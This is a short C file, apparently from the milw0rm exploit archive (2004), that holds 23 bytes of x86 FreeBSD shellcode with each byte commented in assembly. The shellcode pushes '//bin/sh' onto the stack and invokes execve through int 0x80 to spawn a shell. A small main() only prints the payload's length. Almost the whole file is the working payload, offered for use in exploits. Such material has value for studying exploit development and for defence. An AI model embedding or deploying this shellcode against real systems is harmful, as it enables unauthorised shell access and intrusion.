/* FreeBSD 23 byte execve code. Greetz to anathema, the first who published  *
 * this way of writing shellcodes.                                           *
 *  greetz to preedator                              marcetam                *
 *                                                admin@marcetam.net         *
 ****************************************************************************/

char fbsd_execve[]=
  "\x99"                  /* cdq              */
  "\x52"                  /* push %edx        */
  "\x68\x6e\x2f\x73\x68"  /* push $0x68732f6e */
  "\x68\x2f\x2f\x62\x69"  /* push $0x69622f2f */
  "\x89\xe3"              /* movl %esp,%ebx   */
  "\x51"                  /* push %ecx - or %edx :) */
  "\x52"                  /* push %edx - or %ecx :) */
  "\x53"                  /* push %ebx        */
  "\x53"                  /* push %ebx        */
  "\x6a\x3b"              /* push $0x3b       */
  "\x58"                  /* pop %eax         */
  "\xcd\x80";             /* int $0x80        */

int main() {
  void (*run)()=(void *)fbsd_execve;
  printf("%d bytes \n",strlen(fbsd_execve));
}

// milw0rm.com [2004-09-26]